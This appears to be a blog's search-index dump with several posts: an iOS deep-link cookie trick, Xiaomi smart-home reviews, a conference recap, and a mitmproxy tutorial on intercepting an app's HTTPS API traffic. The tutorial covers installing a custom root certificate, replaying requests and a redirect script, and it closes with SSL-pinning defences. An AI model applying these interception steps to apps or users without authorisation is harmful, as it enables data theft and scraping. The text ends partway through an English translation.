self.SharedCookieView.addSubview(sharedCookieViewController.view) sharedCookieViewController.beginAppearanceTransition(true, animated: false) sharedCookieViewController.didMove(toParentViewController: self) sharedCookieViewController.endAppearanceTransition()}sharedCookieViewController.delegate = selfclass HomeViewController: UIViewController, SFSafariViewControllerDelegateYou need to add this delegate to capture the callback after the loading is complete.We can capture the loading completion event in:func safariViewController(_ controller: SFSafariViewController, didCompleteInitialLoad didLoadSuccessfully: Bool) {At this point, you might think that the next step is to read the cookies from the webpage in didCompleteInitialLoad, and that would be it!I haven’t found a method to read cookies from SFSafariViewController; the methods found online all return empty results. Alternatively, you might need to use JavaScript to interact with the page content, asking JavaScript to read the cookies and return them to the UIViewController.The Tricky URL Scheme MethodSince iOS does not know how to obtain shared cookies, we can directly let the “cookie reading page” help us “read the cookies.”The getCookie() method from the JavaScript cookie handling approach mentioned earlier is used for this. Our “cookie reading page” is a blank page (since the user won’t see it), but in the JavaScript part, we need to read the cookies after the body onload:&lt;html&gt;&lt;head&gt; &lt;title&gt;Load iOS Deep Link Saved Cookie...&lt;/title&gt; &lt;script&gt; function checkCookie() { var iOSDeepLinkData = getCookie(\"iOSDeepLinkData\"); if (iOSDeepLinkData &amp;&amp; iOSDeepLinkData != '') { setcookie(\"iOSDeepLinkData\", \"\", -1); window.location.href = iOSDeepLinkData; /// marry://topicID=1&amp;type=topic } } &lt;/script&gt;&lt;/head&gt;&lt;body onload=\"checkCookie();\"&gt;&lt;/body&gt;&lt;/html&gt;The actual principle is summarized as follows: when HomeViewController viewDidLoad is called, we add the SFSafariViewController to stealthily load the loadCookie.html page. The loadCookie.html page checks for previously stored cookies, and if found, it reads and clears them, then uses window.location.href to call and trigger the URL Scheme mechanism.Thus, the corresponding callback handling will return to the AppDelegate in the func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -&gt; Bool method for processing.Done! Summary:If you find this tedious, you can directly use branch.io or Firebase Dynamic—there’s no need to reinvent the wheel. This is because of the need for interface customization and some complex requirements, so I had to build it myself.Users on iOS 9 are already very rare, so if it’s not necessary, you can ignore it; using the clipboard method is quick and efficient, and with the clipboard, you don’t have to limit the link to be opened in Safari!If you have any questions or suggestions, feel free to contact me.```This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 21,132 Total Views Last Statistics Date: 2025-08-15 | 20,950 Views on Medium." }, { "title": "iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居", "url": "/posts/zrealm-life/ios-13-1-%E4%BD%BF%E7%94%A8-%E6%8D%B7%E5%BE%91-%E8%87%AA%E5%8B%95%E5%8C%96%E5%8A%9F%E8%83%BD%E6%90%AD%E9%85%8D%E7%B1%B3%E5%AE%B6%E6%99%BA%E6%85%A7%E5%AE%B6%E5%B1%85-21119db777dd/", "categories": "ZRealm Life.", "tags": "米家, ios-13, siri, siri-shortcut, 生活", "date": "2019-09-26 22:23:36 +0800", "snippet": "iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居直接使用 iOS ≥ 13.1 內建的捷徑APP完成自動化操作前言今年 7 月初的時候買了米家檯燈 Pro、米家 LED 智慧檯燈兩個智能設備，差別在一個能支援HomeKit，一個僅支援米家；當時寫了篇「 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 」文章，裡面提到如何在沒有 HomePod/AppleTV...", "content": "iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居直接使用 iOS ≥ 13.1 內建的捷徑APP完成自動化操作前言今年 7 月初的時候買了米家檯燈 Pro、米家 LED 智慧檯燈兩個智能設備，差別在一個能支援HomeKit，一個僅支援米家；當時寫了篇「 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 」文章，裡面提到如何在沒有 HomePod/AppleTV/iPad 下完成離家、到家兩種模式的智慧功能，步驟有點麻煩。這次 iOS ≥13.1 (注意是 13.1 之後才開放)，內建的「 捷徑 」APP ( 若找不到請從 Store 下載回來) 支援自動化功能；如果 IFTTT、米家米家智慧，只是現在不用再特別使用第三方APP囉！ p.s 如果你有HomePod、apple tv、iPad 完全不用看這篇文章；可以直接把設備設成家庭中樞即可！達成效果進入、離開設定區域會收到捷徑執行通知，點擊後會自動執行。如何使用1.先打開米家APP切換到「我的」-&gt;「智慧」 這裡假設你已經把設備加入米家了。選擇「手動執行」 這裡再提一下為什麼不直接用米家的「離開或到達某地」，第一是 大陸用的GPS有偏移 小米沒針對此修正，第二是他只能設定地圖上有地標的地點，他是大陸高德地圖很少台灣地標。下拉「智慧裝置」區塊，新增要操作的裝置及動作點擊「繼續增加」加入所有要操作的設備範例以「離家」模式為例，離家時我希望能關閉風扇、燈；打開攝影機。點擊右上角「儲存」，輸入此智慧操作的名稱回到列表，點「加入 Siri 」點擊要加入的智慧操作旁的「加入 Siri 」輸入「呼叫Siri 時的指令」-&gt; 「Add to Siri」這邊要注意！ 指令不可以與 iOS 內建指令衝突！2.打開 「 Siri捷徑 」 APP切換到「自動化」頁籤，點擊右上角「+」 若沒有「自動化」頁籤請確認您的 iOS 版本是否高於 13.1。選擇「製作個人自動化操作」選擇類型「抵達」或「離開」設定「位置」搜尋位置或使用當前位置，點「完成」下方可設定自動執行時間範圍，點右上角「下一步」因為離家、到家是全天候都要偵測的事件；所以這邊就不設會執行的時間範圍了！點選「加入動作」選擇「工序指令」滑到「捷徑」區塊，選擇「執行捷徑」點選「捷徑」區塊找到剛在米家「加入 Siri」設定的「呼叫Siri 時的指令」，選擇點右上角「完成」首頁就會出現剛新增的自動化操作囉！完成！實際執行結果當離開、進入設定地址的範圍時，手機、Apple Watch 就會收到執行捷徑的動作通知，點擊即可執行！ 1.GPS感應範圍存在 100 公尺誤差 2. 所謂「自動化」只是自動通知你按執行 ，不是真的自動在背景執行動作 以上兩個痛點要解決就只能用文章開頭所說的，買一台HomePod或是找一台 apple tv/iPad 當家庭中樞。iPhone上 :執行通知點擊即可「執行」請注意，會要求解鎖手機後才能。執行失敗也會反饋！有時候米家設備網路問題會執行失敗。Apple Watch 上：點擊即可執行不同於 IFTTT 原生內建 APP 的強大就在於它手錶上的通知也能執行。(IFTTT的是純通知，還是要拿手機出來點執行)除此之外使用 Siri 呼叫執行因為已將米家智慧操作場景加入到 Siri 了，所以也可以呼叫 Siri 執行動作！ 離智能生活又更近一步了！延伸閱讀 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 （米家智慧攝影機及米家智慧檯燈、Homekit設定教學） 小米智慧家居新添購（AI音箱、溫濕度感應器、體重計2、直流變頻電風扇） 米家 APP / 小愛音箱地區問題 [進階篇]示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKit有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 16,897 Total Views Last Statistics Date: 2025-08-15 | 15,906 Views on Medium." }, { "title": "小米智慧家居新添購", "url": "/posts/zrealm-life/%E5%B0%8F%E7%B1%B3%E6%99%BA%E6%85%A7%E5%AE%B6%E5%B1%85%E6%96%B0%E6%B7%BB%E8%B3%BC-bcff7c157941/", "categories": "ZRealm Life.", "tags": "小米, 米家, 生活, 家電, 開箱", "date": "2019-09-26 21:16:42 +0800", "snippet": "小米智慧家居新添購AI音箱、溫濕度感應器、體重計2、直流變頻電風扇 使用心得入坑既上一篇「 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 」入手&amp;介紹如何使用小米智慧家居後；又持續買了幾樣小米居家產品，並且想盡辦法讓所有家電都智慧化….只能說真的是個坑，起初只是想買個檯燈覺得小米美美的，順帶研究了智慧功能，就這樣入坑了！新添購 — 小米AI音箱價格：NT$ 1...", "content": "小米智慧家居新添購AI音箱、溫濕度感應器、體重計2、直流變頻電風扇 使用心得入坑既上一篇「 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 」入手&amp;介紹如何使用小米智慧家居後；又持續買了幾樣小米居家產品，並且想盡辦法讓所有家電都智慧化….只能說真的是個坑，起初只是想買個檯燈覺得小米美美的，順帶研究了智慧功能，就這樣入坑了！新添購 — 小米AI音箱價格：NT$ 1,495特色： 可語音控制米家所有串連的智慧設備 台灣地區送 KKBOX 會員 3 個月 語音智能強大；跟 Siri 比起來，Siri = 3歲小孩¶小愛同學除了有基本的語音助理功能（查天氣、新聞、資料、控制家電、播音樂….）¶還有超多擴充的技能（問美劇、玩小遊戲、聊天、講相聲、 扮女僕，沒錯就是用女僕口吻跟你對話！！ ）¶支援自訂功能（自訂詞、對應的動作） 另外差別最大的是他比較會舉一反三，不像 Siri 你問他天氣他也就只回妳天氣就沒了；小愛同學會順帶問你要不要提醒你帶傘之類的，更貼心有溫度。 360 度收音、放音，音量很夠；呼叫也很靈敏準確。 可直接當藍芽音樂播放音箱缺點： 當藍牙音響時 ，看影片會有1–2秒嚴重延遲；這算是蠻嚴重的缺陷，查大陸論壇也無解決辦法，官方擺爛，貌似是硬體問題。 不支援 Spotify / Apple Music ，像我非 KKBOX 用戶，送的 3 個月到期後不想花錢就只能切到大陸地區使用 QQ 音樂。 不像 HomePod 支援家庭中樞功能，本來我預期的是可以把小米音箱當智慧家庭的中樞中心，然後我到家，米家感應到小米音箱就能自動執行對應的動作（就是蘋果HomePod+HomeKit那套）；看來是不行！ 要另外裝一個 小愛音箱 APP 跟米家APP要設同個地區，我米家APP設在大陸(因功能較多)，小愛同學也只能設大路綜合上述，日常使用下就只是個只能播音樂的藍牙音箱，偶爾叫小愛同學時間到叫我…就這樣，其實 Siri 就能做到；無法當電腦的藍牙音響對我來說真的很痛，但不得不說他的語音功能真的很智慧、很厲害！可以買來玩玩。新添購 — 米家藍牙溫濕度計小物，NT$ 365要另外再買一顆4號電池來裝；官方號稱續航可達一年，外觀圓形小巧、磁掛式設計隨時拿下來把玩都很方便，雙排顯示螢幕能快速掌握目前溫度及濕度。APP 溫度紀錄僅支援藍牙連線，所以手機超過藍牙範圍後就無法讀取到數據；除非購買藍芽網關或是支援藍芽網關功能的其他米家設備。官方文件的支援藍芽網關設備列表一般來說是能連WiFi跟藍牙的設備都支援，但 小米AI音箱居然不行 ！！而且我發現一件神奇的事，就是 米家直流變頻電風扇居然可以 ，WTF! ! ! !；所以我目前是透過米家電風扇把溫濕度計的訊息用WiFi傳到網路給我。真的很詭異．．．小米AI音箱、檯燈、桌燈、攝影機都不支援藍芽網關功能，電風扇居然支援！ *不確定是否是只有溫濕度計能這樣另外補充溫濕度計會不一直發推播通知推播溫度太高或太潮濕的消息（但台灣這些溫濕度是很正常的…）關閉方式：可以到「我的」-&gt; 右上角「設定」-&gt; 裝置通知 -&gt; 找到米家藍芽溫濕度計 -&gt; 關閉關閉之後就不會再收到推播通知消息了！新添購 — 體重計2就是個體重計，NT$ 395除了能APP記錄體重外多了秤物、平衡測試…功能，但就是體重計，比較常用的就是量體重而已；外型精美，放在家裡不用也能提升質感！體重計也要另外下載一個小米健康的APP，在秤重時打開APP就能同步紀錄體重。小米健康APP新添購 — 直流變頻電風扇這次設備添購中最滿意的電器，NT$ 1995首先電風扇的基本功能方面左右擺角120度範圍很大，風力調節支援1–100段，風力大小隨心所欲；我最喜歡的是另一個「自然風」模式，因為我怕熱喜歡直吹但很常直吹一陣子之後覺得不太舒服，這個自然風可以讓我一直保持直吹模式，不會不舒服！外觀設計ㄧ樣保持小米白色簡潔的設計，我個人不喜歡電扇太金屬(感覺就髒髒的)；小米電扇很輕盈乾淨，沒用放著，看也舒服。智能方面加入米家APP之後，可以從APP控制所有參數(模式、開關、風力、角度)；另外也可以設定週期定時(EX:週一～週五早上7:00關閉)、與米家設備連動(EX:回家自動打開、溫度高於30度自動打開)…等等智慧家居功能可以玩另外就是發現它能當藍芽網關，幫米家藍牙溫濕度計傳輸數據。 *不確定是否是只有溫濕度計能這樣目前已有設備整理 米家智慧攝影機雲台版 1080P (支援：米家) 米家檯燈 Pro (支援：Apple HomeKit、米家) 米家 LED 智慧檯燈 (支援：米家) 小米AI音箱 米家藍芽溫濕度感應器 小米體重計2 米家直流變頻電風扇總結以上就是這次新添購項目心得整理，距離理想（溫度太高自動開冷氣、電風扇跟人、回家開燈、離家關燈開攝影機、濕度太高開除濕機）還有很常的路要走，甚至非常崎嶇…要會改電路、還有發現我的除濕機是沒有回歸功能、冷氣也是舊型；米家很多設備台灣也沒賣(EX:萬能遙控器)，本來想衝智慧家庭組，但想想用途不大，目前繼續研究還有啥能上智能！延伸閱讀 智慧家居初體驗 — Apple HomeKit &amp; 小米米家（米家智慧攝影機及米家智慧檯燈、Homekit設定教學） iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居（直接使用 iOS ≥ 13.1 內建的捷徑APP完成自動化操作） 米家 APP / 小愛音箱地區問題 [進階篇]示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKit有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,388 Total Views Last Statistics Date: 2025-08-15 | 1,155 Views on Medium." }, { "title": "iPlayground 2019 是怎麼樣的體驗？", "url": "/posts/zrealm-dev/iplayground-2019-%E6%98%AF%E6%80%8E%E9%BA%BC%E6%A8%A3%E7%9A%84%E9%AB%94%E9%A9%97-4079036c85c2/", "categories": "ZRealm Dev.", "tags": "iplayground, iplayground2019, ios-app-development, swift, taiwan-ios-conference", "date": "2019-09-22 21:47:18 +0800", "snippet": "iPlayground 2019 是怎麼樣的體驗？iPlayground 2019 火熱熱參加心得關於活動去年辦在10月中，我也是去年10月初才開始經營 Medium 記錄生活；結合聽到的 UUID 議題跟參加心得也寫了篇 文章 ；今年繼續來 寫心得蹭熱度 ！iPlayground 2019 (本次一樣是由 公司 補助企業票)相較 2018 年第一屆，今年在各方面又更大幅度提升！首先是場地部...", "content": "iPlayground 2019 是怎麼樣的體驗？iPlayground 2019 火熱熱參加心得關於活動去年辦在10月中，我也是去年10月初才開始經營 Medium 記錄生活；結合聽到的 UUID 議題跟參加心得也寫了篇 文章 ；今年繼續來 寫心得蹭熱度 ！iPlayground 2019 (本次一樣是由 公司 補助企業票)相較 2018 年第一屆，今年在各方面又更大幅度提升！首先是場地部分 ，去年在地下一樓會議廳，活動空間不大頗有壓迫感、講座教室用電腦不易；今年直接拉到台大博雅館舉辦，場地很大很新不會人擠人、教室有桌子/插座，方便使用個人電腦！議程方面 ，除了國內的大大，這次也廣邀國外講者來台分享；其中高朋滿座的絕非貓神 王巍(Wei Wang) 莫屬；今年也首次加入 workshop 手把手教學，不過名額有限，要搶要快…顧著吃飯跟喇賽就這樣錯過了。贊助商攤位、 Ask the Speaker 區 因場地大交流更方便、更多活動；從 iChef 攤位 #iCHEFxiPlayground 獲得了一組環保吸管及銅鑼燒、 Dcard 攤位去年已拿過，今年又拿到一組貼紙+環保杯套，今年多一個厭世語錄濕紙巾、 17 直播 填問券抽 Airpods 2 、在 [ weak self ] Podcast 攤位拿了貼紙，另外還有 Grindr 、 CakeResume 、 Bitrise 的攤位可以互動，附上一張 不齊全 的戰利品照。不齊全的戰利品吃的及 After Party ，兩天都是精緻餐盒，冰咖啡、茶飲全天無限量供應；但去年比較有 After Party 的感覺，像是在酒吧聽台上的大大說故事，非常有趣；今年比較是下午茶(ㄧ樣有供應酒，燒賣跟甜點好吃！)；自行交流，但反而我今年才有認識到新朋友。吃貨必備，便當照Top 5 議程收穫1. 王巍(Wei Wang) ( 貓神) 的 網路請求元件設計這部分很有感，因為我們的專案並沒有使用第三方網路套件；而是自己封裝方法，講者說的很多設計模式、問題，也是我們需要去做的優化及重構項目，套用講者說的： 「垃圾需要分類，代碼也是…」這部分要好好回去研究了，我會做好分類的&lt;( _ _ )&gt;p.s 沒搶到 KingFisher 貼紙 QQ2. 日本的大大 kishikawa katsumi介紹 iOS ≥ 13 推出的新方法 UICollectionViewCompositionalLayout ，讓我們不用在像之前ㄧ樣去 subclass UICollectionViewLayout 或是用 CollectionView Cell 包 CollectionView 的方式完成複雜的佈局。這部分同樣有感，我們的 APP 就是使用後者的方式達成設計想要呈現的樣式，巔峰之作還有 CollectionView Cell 包 CollectionView 再包 CollectionView (三層)，程式碼很亂不易維護。除了介紹 UICollectionViewCompositionalLayout 的架構、使用方式，特別之處在於講者依照此模式自己做了一個專案，讓 iOS 12 以前的 App ㄧ樣能支援同樣的效果 — IBPCollectionViewCompositionalLayout ，太神啦！3. Ethan Huang 大大的 用 SwiftUI 開發 Apple Watch APP之前寫過一篇「 動手做一支 Apple Watch App 吧！ 」，是基於 watchOS 5 使用傳統方式；沒想到現在居然能用SwiftUI開發了！Apple Watch OS 6 是 1~5 代都支援，所以 比較沒有版本的問題 ，用手錶應用練習SwiftUI也是不錯的當出發點(相較簡化)；再找時間來翻新。p.s 只是沒想到 watchOS 的開發者也這麼邊緣QQ 我個人是覺得蠻好玩的，希望有更多人可以加入！4. TinXie-易致及羊小咩兩位大大的 APP安全議題關於 APP 本身的安全問題， 從未認真研究過，固有觀念就是「蘋果很封閉很安全！」；聽了兩位講者的演示之後覺得真是脆而不堅，也了解到 APP 安全本身的核心概念： 「當破解成本大於保護成本，APP就是安全的」沒有保證安全的 APP，只有增加破解的難易度，勸退攻擊者！還有收獲除了 Reveal 這個付費APP之外，還有開源免費的 Lookin 可以看 APP UI；Reveal 我們很常用；即使不看別人，看自己 Debug UI 問題也很方便！另外 關於連線安全的部分 ，前幾天剛好發了一篇「 APP有用HTTPS傳輸，但資料還是被偷了。 」，使用 mitmproxy 這套免費軟體做中間人攻擊抽換 root ca ；經過講者講解 中間人攻擊、原理、防護方式，一方面也驗證我寫的內容正不正確，另一方面也更了解了這個手法的道理！順便開了開眼界…知道有越獄插件可以直接攔截網路請求，連憑證抽換都不用。5. 丁沛堯大大的 優化編譯速度這也是一直以來苦惱我們的問題，編譯很慢；有時在 UI 微調時真的會抓狂，就只調個 1pt ，然後就要等，然後看到結果，然後再修正個 1pt ，然後再等，然後又調回去…while(true)….很抓狂的！講者提到的嘗試、經驗分享，很值得回去研究用在自己的專案上！ 還有很多議程（例如：色色的事A_A，之前也踩過顏色的雷） 但由於筆記較零散、個人沒有相關經驗或沒聽到該場次議程 所有內容可以等 iPlayground 2019 釋出錄影回放(有錄影的場次)、或參考官方的 HackMD 共筆筆記內容 。軟性收穫除了技術方面的收穫，我個人比去年更多的是「 軟性收穫 」，第一次跟 Ethan Huang 大大照了個面，在討論 Apple Watch 開發生態時無意間也跟貓神大大交流了幾句；另外也認識了許多新的開發者，同事 Frank 跟 George Liu 的同學 Taihsin 、 Spock 薛 、 Crystal Liu 、 Nia Fan 、 Alice 、 Ada ，老同學 Peter Chen 、老同事皓哥 邱鈺晧 …等等新朋友！yes! 更多花絮可以到 Twitter #iplayground 查看感謝 感謝所有工作人員的辛勞及講者的分享，才有這兩天收穫滿滿的活動！ 辛苦了！謝謝！有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 747 Total Views Last Statistics Date: 2025-08-15 | 711 Views on Medium." }, { "title": "APP有用HTTPS傳輸，但資料還是被偷了。", "url": "/posts/zrealm-dev/app%E6%9C%89%E7%94%A8https%E5%82%B3%E8%BC%B8-%E4%BD%86%E8%B3%87%E6%96%99%E9%82%84%E6%98%AF%E8%A2%AB%E5%81%B7%E4%BA%86-46410aaada00/", "categories": "ZRealm Dev.", "tags": "mitmproxy, man-in-the-middle, ios, ios-app-development, hacking", "date": "2019-09-20 18:01:01 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.APP有用HTTPS傳輸，但資料還是被偷了。iOS+MacOS 使用 mitmproxy 進行中間人攻擊(Man-in-the-middle attack) 嗅探API傳輸資料教學及如何防範？前言前陣子剛在公司辦完一場內部的 ...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.APP有用HTTPS傳輸，但資料還是被偷了。iOS+MacOS 使用 mitmproxy 進行中間人攻擊(Man-in-the-middle attack) 嗅探API傳輸資料教學及如何防範？前言前陣子剛在公司辦完一場內部的 CTF競賽 ，在發想題目時回想起大學時候還在做後端(PHP)時經手的專案，一個集點的APP，大概就是有個任務列表，然後觸發條件完成就Call API獲得點數；老闆認為Call API有經過HTTPS加密傳輸資料就很安全了 — 直到我向他展示中間人攻擊，直接嗅探傳輸資料，偽造API呼叫獲得點數….再加上最近幾年大數據崛起，網路爬蟲滿天飛；爬蟲攻防戰日漸白熱化， 爬取與防爬之間花招百出 ，只能說道高一尺魔高一丈啊！爬蟲的另一條下手對象就是APP的API，如果沒有任何防範幾乎等於門戶大開；不但好操作而且格式也乾淨，更不容易被識別阻擋；所以如果網頁端已經費盡全力阻擋，資料還是不段被爬，不妨檢查一下APP的API有無漏洞。因為這個議題我不知道該如何出在 CTF比賽中 ，所以就單拉出一篇文章作為紀錄 ；本篇只是粗淺給個概念 — HTTPS能透過憑證替換進行傳輸內容解密 、如何加強安全性防止；實際網路理論不是我的強項也都還給老師了，如果已經有這方面概念的朋友就不用花時間看這篇，或拉到底看APP該如果保護！實際操作環境: MacOS + iOS Android 使用者可以直接下載 Packet Capture (免費)、iOS 用戶可使用 Surge 4 這套軟體( 付費) 解鎖中間人攻擊功能、MacOS也可以使用另一套付費軟體Charles。 本文章主要講解iOS使用 免費 的 mitmproxy 進行操作，如果您有上述的環境就不用這麼麻煩啦，直接APP打開在手機上掛載VPN替換掉憑證就能進行中間人攻擊！(ㄧ樣請直接下拉到底看該如何保護！)[2021/02/25 更新]： Mac 有新的免費圖形化介面程式 ( Proxyman ) 可以用，可搭配 參考此篇文章 的第一部分。安裝 mitmproxy直接使用 brew 安裝 ：brew install mitmproxy安裝完成!p.s 如果你出現 brew: command not found 請先安裝 brew 套件管理工具 ：/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"mitmproxy 使用安裝完成後，在 Terminal 輸入以下指令啟用：mitmproxy啟動成功讓手機跟Mac在同個區域網路內&amp;取得Mac的IP位址方法(1) Mac 連接 WiFi、手機也使用同個 WiFiMac的IP位址 = 「系統偏好設定」-&gt;「網路」-&gt;「Wi-Fi」-&gt;「IP Address」方法(2) Mac 使用有線網路，開啟網路分享；手機連上該熱點網路:「系統偏好設定」-&gt; 「共享」-&gt;選擇「乙太網路」-&gt;「Wi-Fi」打勾-&gt; 「Internet 共享」啟用Mac的IP位址 = 192.168.2.1 （️️注意⚠️ 不是乙太網路網路的IP，是Mac用做網路分享基地台的IP)手機網路設置WiFi — Proxy伺服器資訊「設定」-&gt; 「WiFi」-&gt; 「HTTP 代理伺服器」-&gt; 「手動」-&gt; 「伺服器輸入 Mac的IP位址 」-&gt; 「連接埠輸入 8080 」-&gt; 「儲存」 這時網頁打不開、出現憑證錯誤是正常的；我們繼續往下做…安裝 mitmproxy 自訂 https 憑證如同上述所說，中間人攻擊的實現方式就是在通訊之中使用自己的憑證做抽換加解密資料；所以我們也要在手機上安裝這個自訂的憑證。1.用手機safari打開 http://mitm.it出現左邊-&gt;Proxy設定✅/ 出現右邊代表 Proxy設定有誤🚫「Apple」-&gt;「安裝描述檔」-&gt;「安裝」 ⚠️到這裡還沒結束，我們還要去關於裡啟用描述檔「一般」-&gt;「關於」-&gt;「憑證信任設定」-&gt;「mitmproxy」啟用完成！這時我們再回去瀏覽器就能正常瀏覽網頁了。回到Mac 上操作 mitmproxy可以在mitmproxy Terminal上看到剛手機的資料傳輸紀錄找到想嗅探的紀錄進入查看Request(送出哪些參數)/Response(回傳了什麼內容)常用操作按鍵集：「 ? 」= 查看按鍵操作集文檔「 k 」/「⬆」= 上 「 j 」/「⬇」= 下 「 h 」/「⬅」= 左 「 l 」/「➡️」️= 右 「 space 」= 下一頁「 enter 」= 進入查看詳情「 q 」= 返回上一頁/退出「 b 」= 匯出response body到指定path文字檔 「 f 」= 篩選紀錄條件「 z 」= 清除所有紀錄「 e 」= 編輯Request(cookie、headers、params...)「 r 」= 重新發送Request不習慣CLI? 沒關係，可以改用 Web GUI !除了 mitmproxy 啟用方式之外，我們可以改下：mitmweb就能使用新的 Web GUI 進行操作觀察mitmweb重頭戲，嗅探APP資料：上述環境都建置完成也熟悉之後，就可以進入我們的重頭戲；嗅探APP API的資料傳輸內容！ 這邊以某房屋APP作為範例，無惡意純學術交流使用! 我們想知道物件列表的API是如何請求和回傳什麼內容!首先先按「z」清除所有紀錄(避免搞亂)開啟目標 APP開啟目標 APP 嘗試「下拉重整」或觸發「載入下一頁」的動作。 🛑若你的目標APP打不開、連不上；那抱歉了，代表APP有做防範無法用這招嗅探，請直接下拉到如何保護的章節🛑mitmproxy 紀錄回到 mitmproxy 查看紀錄，發揮偵探的精神猜測哪個API請求紀錄是我們想要的並進入查看詳細！RequestRequest 部分可以看到 請求傳遞了哪些參數搭配「e」編輯與「r」重新發送，並觀察 Response 就可以猜到每個參數的用途囉！ResponseResponse 也能直接獲得原始回傳內容。 🛑若Response內容是一堆編碼；那也抱歉了，代表APP可能有自己再做一次加解密無法用這招嗅探，請直接下拉到如何保護的章節🛑很難閱讀？中文亂碼？沒關係，這邊可以用「b」匯出成文字檔到桌面，再將內容複製到 Json Editor Online 解析即可! *或是直接使用 mitmweb 使用 web gui 直接瀏覽、操作mitmweb經過嗅探、觀察、過濾、測試之後就能知道APP API的運作方式，藉此就能利用，用爬蟲爬取資料。 *蒐集完所需資訊記得關閉mitmproxy、手機網路Proxy代理伺服器改回自動，才能正常使用網路。APP 該如何自保？若掛上 mitmproxy 之後發現APP不能用、回傳內容是編碼，代表APP有做保護。做法(1):大略是將憑證資訊放一份到APP中，若當前HTTPS使用的憑證與APP中的資訊不符則拒絕訪問，詳細可以 看此 或找 SSL Pinning 相關資源。缺點可能就是要注意憑證有效期的問題吧！https://medium.com/@dzungnguyen.hcm/ios-ssl-pinning-bffd2ee9efc作法(2):APP端在資料要傳輸前先進行編碼加密，API後端收到後解密取得原始請求內容；API回傳內容一樣先進行編碼加密，APP端收到資料後解密取得回傳內容；步驟很煩瑣也耗效能，但的確是個方法；據我所知好像某數字銀行就是用這招進行保護!不過….作法1，依然有破解方法： 如何在iOS 12上绕过SSL Pinning作法2，透過反編譯工程也能獲得編碼加密用的密鑰⚠️沒有100%的安全⚠️或是乾脆挖個洞讓它爬，邊搜集各種證據，再用法務解決（？還是那句話： 「 NEVER TRUST THE CLIENT」mitmproxy 的更多玩法：1.使用mitmdump除 mitmproxy 、 mitmweb ， mitmdump 可直接將所有紀錄匯出到文字檔中mitmdump -w /log.txt並且能使用 玩法(2) python程式，設定、篩選流量:mitmdump -ns examples/filter.py -r /log.txt -w /result.txt2.搭配python程式做請求參數設定、訪問控制、轉址：from mitmproxy import httpdef request(flow: http.HTTPFlow) -&gt; None: # pretty_host takes the \"Host\" header of the request into account, # which is useful in transparent mode where we usually only have the IP # otherwise. # 請求參數設定 Example: flow.request.headers['User-Agent'] = 'MitmProxy' if flow.request.pretty_host == \"123.com.tw\": flow.request.host = \"456.com.tw\" # 將123.com.tw的訪問全導到456.com.tw轉址範例啟用mitmproxy時加上參數：mitmproxy -s /redirect.pyormitmweb -s /redirect.pyormitmdump -s /redirect.py補個坑在使用 mitmproxy 觀察使用 HTTP 1.1 及 Accept-Ranges: bytes、 Content-Range 長連接片段持續拿取資源的請求時，會等到 response 全部回來才會顯示，而不是顯示分段、使用持久連接接續下載！踩坑在這 。延伸閱讀 以簽到獎勵 APP 為例，打造每日自動簽到腳本 如何打造一場有趣的工程CTF競賽 揭露一個幾年前發現的巧妙網站漏洞 iOS 15 / MacOS Monterey Safari 將能隱藏真實 IP後記因為我沒有網域權限無法取得ssl憑證資訊，所以也無法實作；看程式碼感覺並不困難，雖然沒有100%安全的方法，但多一道防護至少能更安全一些，再繼續攻需要花費很多時間研究，應該能勸退90%的爬蟲了！這篇文章可能有點含金量太低，medium荒廢了一陣子(跑去玩單眼)，主要為本週六日(2019/09/21–2019/09/22)的 iPlayground 2019 提前熱熱寫文手感；期待今年的議程🤩，希望回來後能吸收產出更多精品文章！ [2019/02/22 更新文章] iPlayground 2019 是怎麼樣的體驗？有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 10,134 Total Views Last Statistics Date: 2025-08-15 | 10,083 Views on Medium." }, { "title": "The APP Uses HTTPS for Transmission, But Data Still Gets Stolen.", "url": "/posts/zrealm-dev/en/the-app-uses-https-for-transmission-but-data-still-gets-stolen-46410aaada00/", "categories": "ZRealm Dev.", "tags": "mitmproxy, man-in-the-middle, ios, ios-app-development, hacking", "date": "2019-09-20 18:01:01 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版The APP Uses HTTPS for Transmission, But Data Still Gets Stolen.This article provide...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版The APP Uses HTTPS for Transmission, But Data Still Gets Stolen.This article provides a tutorial on using mitmproxy for man-in-the-middle attacks to sniff API data transmission on iOS and macOS, as well as how to prevent such attacks.IntroductionRecently, we held an internal CTF competition at my company. While brainstorming topics, I recalled a project I worked on during college when I was involved in backend development (PHP). It was a point-collection APP that had a task list, and upon completing certain conditions, it would call an API to earn points. My boss believed that calling the 